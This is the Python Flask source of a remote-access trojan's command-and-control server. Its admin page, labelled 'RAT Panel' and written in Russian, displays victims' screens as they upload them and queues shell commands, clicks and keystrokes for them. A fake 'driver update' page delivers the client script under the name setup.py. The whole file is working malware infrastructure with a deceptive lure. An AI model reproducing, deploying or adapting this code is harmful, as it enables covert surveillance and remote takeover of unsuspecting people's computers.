from flask import Flask, render_template_string, request, send_file
import os

app = Flask(__name__)

latest_screenshot = 'screen.jpg'
commands = []

HTML_ADMIN = """
<!DOCTYPE html>
<html>
<head><title>RAT Panel</title></head>
<body style="background:#111; color:white; text-align:center; font-family:Arial; margin:0; padding:20px;">
    <h1>Панель управления</h1>
    <div style="display:flex; justify-content:center; gap:20px; margin-bottom:20px;">
        <div style="width:70%;">
            <img id="screen" src="/get_screen" style="width:100%; border:2px solid red; cursor:crosshair;" onclick="sendClick(event)">
        </div>
        <div style="width:25%; background:#222; padding:10px; border-radius:5px; text-align:left;">
            <h3 style="text-align:center;">Действия</h3>
            <button onclick="sendCmd('calc')" style="width:100%; padding:10px; margin-bottom:5px; background:green; color:white; border:none; cursor:pointer;">Калькулятор</button>
            <button onclick="sendCmd('notepad')" style="width:100%; padding:10px; margin-bottom:5px; background:blue; color:white; border:none; cursor:pointer;">Блокнот</button>
            <button onclick="sendCmd('start https://google.com')" style="width:100%; padding:10px; margin-bottom:5px; background:purple; color:white; border:none; cursor:pointer;">Открыть сайт</button>
        </div>
    </div>
    
    <div style="margin-bottom:10px;">
        <input type="text" id="cmd" placeholder="Введи команду..." style="padding:10px; width:300px;">
        <button onclick="sendCmd(document.getElementById('cmd').value)" style="padding:10px; background:orange; color:black; border:none; cursor:pointer;">Выполнить</button>
    </div>
    <div>
        <input type="text" id="text" placeholder="Введи текст для печати..." style="padding:10px; width:300px;">
        <button onclick="sendText()" style="padding:10px; background:#007bff; color:white; border:none; cursor:pointer;">Напечатать</button>
    </div>
    
    <script>
        function refreshImg() {
            document.getElementById('screen').src = "/get_screen?t=" + new Date().getTime();
        }
        setInterval(refreshImg, 1500);

        function sendClick(e) {
            var img = document.getElementById('screen');
            var rect = img.getBoundingClientRect();
            var x = (e.clientX - rect.left) / rect.width;
            var y = (e.clientY - rect.top) / rect.height;
            fetch('/click', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({x: x, y: y}) });
        }

        function sendCmd(cmd) {
            if(!cmd) return;
            fetch('/run_cmd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: cmd}) });
        }
        
        function sendText() {
            var text = document.getElementById('text').value;
            if(!text) return;
            fetch('/type', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: text}) });
            document.getElementById('text').value = '';
        }
    </script>
</body>
</html>
"""

HTML_VICTIM = """
<!DOCTYPE html>
<html>
<head><title>Обновление драйверов</title></head>
<body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
    <h1>Скачайте установщик</h1>
    <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать</a>
</body>
</html>
"""

@app.route('/')
def index():
    if request.args.get('admin') == 'true':
        return render_template_string(HTML_ADMIN)
    return render_template_string(HTML_VICTIM)

@app.route('/get_screen')
def get_screen():
    try: return send_file(latest_screenshot, mimetype='image/jpeg')
    except: return "Нет данных"

@app.route('/upload_screen', methods=['POST'])
def upload_screen():
    global latest_screenshot
    file = request.files['file']
    file.save(latest_screenshot)
    return "OK"

@app.route('/get_commands', methods=['GET'])
def get_commands():
    global commands
    if commands:
        return commands.pop(0)
    return "NONE"

@app.route('/click', methods=['POST'])
def click():
    data = request.json
    commands.append(f"CLICK|{data['x']}|{data['y']}")
    return "OK"

@app.route('/type', methods=['POST'])
def type_text():
    data = request.json
    commands.append(f"TYPE|{data['text']}")
    return "OK"

@app.route('/run_cmd', methods=['POST'])
def run_cmd():
    data = request.json
    commands.append(f"CMD|{data['cmd']}")
    return "OK"

@app.route('/download')
def download():
    return send_file('client.py', as_attachment=True, download_name='setup.py')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
